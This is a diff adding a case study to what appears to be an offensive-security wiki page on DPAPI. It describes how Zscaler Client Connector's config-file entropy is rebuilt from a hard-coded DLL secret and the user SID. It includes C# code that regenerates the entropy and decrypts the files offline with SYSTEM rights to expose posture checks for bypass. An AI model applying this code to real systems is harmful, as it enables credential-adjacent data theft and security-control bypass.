@@ -341,7 +341,47 @@ With extracted from LDAP computers list you can find every sub network even if y
 * **Chrome 127 “App-Bound” cookie encryption** (July 2024) replaced the legacy DPAPI-only protection with an additional key stored under the user’s **Credential Manager**. Offline decryption of cookies now requires both the DPAPI masterkey and the **GCM-wrapped app-bound key**. SharpChrome v2.3 and DonPAPI 2.x are able to recover the extra key when running with user context. 
 
 
+### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID
+
+Zscaler Client Connector stores several configuration files under `C:\ProgramData\Zscaler` (e.g. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`).  Each file is encrypted with **DPAPI (Machine scope)** but the vendor supplies **custom entropy** that is *calculated at runtime* instead of being stored on disk.
+
+The entropy is rebuilt from two elements:
+
+1. A hard-coded secret embedded inside `ZSACredentialProvider.dll`.
+2. The **SID** of the Windows account the configuration belongs to.
+
+The algorithm implemented by the DLL is equivalent to:
+
+```csharp
+byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
+byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);
+
+// XOR the two buffers byte-by-byte
+byte[] tmp = new byte[secret.Length];
+for (int i = 0; i < secret.Length; i++)
+    tmp[i] = (byte)(sid[i] ^ secret[i]);
+
+// Split in half and XOR both halves together to create the final entropy buffer
+byte[] entropy = new byte[tmp.Length / 2];
+for (int i = 0; i < entropy.Length; i++)
+    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
+```
+
+Because the secret is embedded in a DLL that can be read from disk, **any local attacker with SYSTEM rights can regenerate the entropy for any SID** and decrypt the blobs offline:
+
+```csharp
+byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
+byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
+Console.WriteLine(Encoding.UTF8.GetString(clear));
+```
+
+Decryption yields the complete JSON configuration, including every **device posture check** and its expected value – information that is very valuable when attempting client-side bypasses.
+
+> TIP: the other encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) are protected with DPAPI **without** entropy (`16` zero bytes). They can therefore be decrypted directly with `ProtectedData.Unprotect` once SYSTEM privileges are obtained.
+
 ## References
+
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
 - [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
 - [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
